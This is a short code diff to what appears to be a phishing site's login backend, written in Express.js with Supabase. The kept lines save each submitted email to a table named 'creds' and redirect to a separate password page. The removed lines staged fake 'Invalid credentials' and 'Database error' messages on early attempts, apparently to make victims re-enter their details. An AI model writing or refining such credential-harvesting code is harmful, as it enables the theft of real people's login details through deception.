@@ -121,31 +121,9 @@ app.post('/login', async (req, res) => {
 
     if (countError) throw countError;
 
-    let sessionCount = sessionCountData.count;
-    if (sessionCount % 3 === 1) {
-      const { error: updateError } = await supabase
-        .from('session_count')
-        .update({ count: sessionCount + 1 })
-        .eq('session_id', sessionId);
-      if (updateError) throw updateError;
-
-      console.log("New updated count:", sessionCount + 1)
-      return res.redirect('/login?error=Invalid+credentials');
-    } else if (sessionCount % 3 === 2) {
-      const { error: updateError } = await supabase
-        .from('session_count')
-        .update({ count: sessionCount + 1 })
-        .eq('session_id', sessionId);
-      if (updateError) throw updateError;
-
-      console.log("New updated count:", sessionCount + 1)
-      return res.redirect('/login?error=Database+error')
-    } else {
       await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
-      await supabase.from('session_count').update({ count: 1 }).eq('session_id', sessionId);
-      console.log("New updated count:", sessionCount + 1)
+      
       return res.redirect('/login/password')
-    }
   } catch (err) {
     console.error('Error during login', err);
     return res.redirect('/login?error=Database+error');
